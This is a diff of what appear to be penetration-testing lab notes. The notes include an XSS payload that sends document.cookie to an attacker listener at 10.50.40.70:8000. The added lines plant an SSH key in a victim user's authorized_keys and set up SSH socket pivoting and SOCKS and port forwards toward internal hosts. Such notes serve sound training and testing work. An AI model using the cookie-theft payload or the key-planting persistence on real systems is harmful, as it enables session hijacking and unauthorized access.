@@ -151,7 +151,7 @@ python3 -m http.server
 <script>document.location="http://10.50.40.70:8000/?" + document.cookie;</script>
 DEMO^^^
 #set up port forward to http and ssh
-ssh -S /tmp/jump jump -O forward -L 5150:10.100.28.40:80 5151:10.100.28.40:4444
+ssh -S /tmp/jump jump -O forward -L 5150:10.100.28.40:80 -L 5151:10.100.28.40:4444
 # Robots.txt
         User-agent: *
         Disallow: /net_test
@@ -170,4 +170,15 @@ Allows Commands to be run from middle box
         I took my online training from the following website
         
         10.100.28.55
+#mkdir .ssh in billybob home directory
+#Upload public key in .ssh/authorized_keys
+#Create socket to Billybob
+ssh -MS /tmp/web billybob@127.0.0.1 -p 5151
+#Close old dynamic
+ssh -S /tmp/jump jump -O cancel -D 9050
+#Create dynamic onto billybob
+ssh -S /tmp/web bill -O forward -D 9050
+#Create port forward to T2 web server 
+ssh -S /tmp/web T2  -O foward -L 5152:10.100.28.55:80
+
 
